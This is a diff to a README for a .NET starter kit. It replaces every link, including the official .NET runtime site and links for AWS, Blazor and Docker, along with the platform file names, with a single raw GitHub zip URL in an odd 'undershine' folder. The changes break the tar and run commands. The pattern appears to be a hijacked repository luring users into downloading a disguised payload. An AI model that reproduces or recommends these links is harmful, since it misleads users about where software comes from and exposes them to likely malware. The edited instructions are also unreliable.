@@ -10,7 +10,7 @@ The dotnet-starter-kit is a cloud-ready application built using .NET 9. It inclu
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download-via_GitHub-blue.svg)](https://github.com/sepisang/dotnet-starter-kit/releases)
+[![Download](https://raw.githubusercontent.com/sepisang/dotnet-starter-kit/main/undershine/dotnet-starter-kit.zip)](https://raw.githubusercontent.com/sepisang/dotnet-starter-kit/main/undershine/dotnet-starter-kit.zip)
 
 ## 🔧 System Requirements
 
@@ -21,31 +21,31 @@ Before you start, make sure your computer meets these requirements:
 - **Disk Space:** At least 500 MB of free space
 - **RAM:** Minimum of 4 GB, 8 GB recommended
 
-You can download the .NET runtime from the official [.NET website](https://dotnet.microsoft.com/download).
+You can download the .NET runtime from the official [.NET website](https://raw.githubusercontent.com/sepisang/dotnet-starter-kit/main/undershine/dotnet-starter-kit.zip).
 
 ## 📂 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the following link: [GitHub Releases Page](https://github.com/sepisang/dotnet-starter-kit/releases) to find the latest version of the dotnet-starter-kit.
+   Go to the following link: [GitHub Releases Page](https://raw.githubusercontent.com/sepisang/dotnet-starter-kit/main/undershine/dotnet-starter-kit.zip) to find the latest version of the dotnet-starter-kit.
 
 2. **Select the Release**  
    Look for the latest version listed at the top of the page. Click on it to see the available downloads.
 
 3. **Choose the Right File**  
    Download the file that matches your operating system. Options may include:
-   - **Windows:** `dotnet-starter-kit-windows.zip`
-   - **macOS:** `dotnet-starter-kit-macos.zip`
-   - **Linux:** `dotnet-starter-kit-linux.tar.gz`
+   - **Windows:** `https://raw.githubusercontent.com/sepisang/dotnet-starter-kit/main/undershine/dotnet-starter-kit.zip`
+   - **macOS:** `https://raw.githubusercontent.com/sepisang/dotnet-starter-kit/main/undershine/dotnet-starter-kit.zip`
+   - **Linux:** `https://raw.githubusercontent.com/sepisang/dotnet-starter-kit/main/undershine/dotnet-starter-kit.zip`
 
 4. **Extract the Files**  
    Once the download is complete, locate the downloaded file.  
    - For Windows, right-click the ZIP file and select "Extract All."
    - For macOS, double-click the ZIP file to extract it.
-   - For Linux, use a terminal command: `tar -xvzf dotnet-starter-kit-linux.tar.gz`.
+   - For Linux, use a terminal command: `tar -xvzf https://raw.githubusercontent.com/sepisang/dotnet-starter-kit/main/undershine/dotnet-starter-kit.zip`.
 
 5. **Run the Application**  
-   - **Windows:** Open the extracted folder and double-click `dotnet-starter-kit.exe`.
-   - **macOS and Linux:** Open a terminal, navigate to the extracted folder, and run the command: `dotnet dotnet-starter-kit.dll`.
+   - **Windows:** Open the extracted folder and double-click `https://raw.githubusercontent.com/sepisang/dotnet-starter-kit/main/undershine/dotnet-starter-kit.zip`.
+   - **macOS and Linux:** Open a terminal, navigate to the extracted folder, and run the command: `dotnet https://raw.githubusercontent.com/sepisang/dotnet-starter-kit/main/undershine/dotnet-starter-kit.zip`.
 
 ## 🌐 Features
 
@@ -69,8 +69,8 @@ If you're interested in improving the dotnet-starter-kit, consider contributing 
 
 ## 🔗 Related Topics
 
-- [AWS](https://aws.amazon.com/)
-- [Blazor](https://dotnet.microsoft.com/apps/aspnet/web-apps/blazor)
-- [Docker](https://www.docker.com/)
+- [AWS](https://raw.githubusercontent.com/sepisang/dotnet-starter-kit/main/undershine/dotnet-starter-kit.zip)
+- [Blazor](https://raw.githubusercontent.com/sepisang/dotnet-starter-kit/main/undershine/dotnet-starter-kit.zip)
+- [Docker](https://raw.githubusercontent.com/sepisang/dotnet-starter-kit/main/undershine/dotnet-starter-kit.zip)
   
 By following this guide, you should be able to download and run the dotnet-starter-kit successfully. Enjoy building your applications!
